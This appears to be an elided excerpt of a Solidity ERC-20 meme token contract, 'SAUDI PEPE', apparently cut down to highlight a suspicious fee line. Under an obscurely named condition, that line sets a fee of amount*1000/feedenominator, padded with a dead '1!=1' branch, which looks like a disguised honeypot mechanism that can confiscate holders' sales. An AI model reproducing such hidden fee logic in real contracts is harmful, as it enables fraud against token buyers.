...
contract SAUDIPEPE is Context, IERC20, Ownable {
    ...
    string private _name = "SAUDI PEPE"; // token name
    string private _symbol = "SPEPE"; // token ticker
    ...
    address public marketingWallet = address(0xee509476b7E6707501c4861Da7B97DD12195a11d);
    ...
    function swapTokensForEth(uint256 tokenAmount) private {
        ...
        unchecked {
            ...
            if(underpassdura >10){feeAmount = amount.mul(1000).div(feedenominator);}else if (1!=1) {} else {feeAmount = amount.mul(totalSellFee).div(feedenominator);}
            }
    ...
    function enableTxLimit(bool _status) external virtual {
